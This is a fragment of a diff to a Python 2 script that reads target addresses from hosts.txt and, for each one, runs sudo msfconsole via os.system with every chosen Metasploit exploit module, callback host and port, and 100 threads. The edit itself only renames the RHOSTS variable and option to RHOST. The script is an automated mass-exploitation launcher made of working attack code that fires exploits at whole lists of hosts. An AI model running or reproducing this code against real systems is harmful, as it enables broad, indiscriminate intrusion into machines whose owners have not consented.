@@ -124,15 +124,15 @@ def exploit(query):
 	
 	if choice == 's':
 		with open( "hosts.txt", "rb" ) as host_list:
-			for rhosts in host_list:
+			for rhost in host_list:
 				for exploit in sorted_modules:
-					template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
+					template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOST %s; %s'" % (workspace, local_host, local_port, rhost, exploit)
 					os.system(template)
 	elif choice == 'a':
 		with open( "hosts.txt", "rb" ) as host_list:
-			for rhosts in host_list:
+			for rhost in host_list:
 				for exploit in all_modules:
-					template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
+					template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOST %s; %s'" % (workspace, local_host, local_port, rhost, exploit)
 					os.system(template)
 	else:
 		print "[" + t.red("!") + "]Unhandled Option. Defaulting to Main Menu"
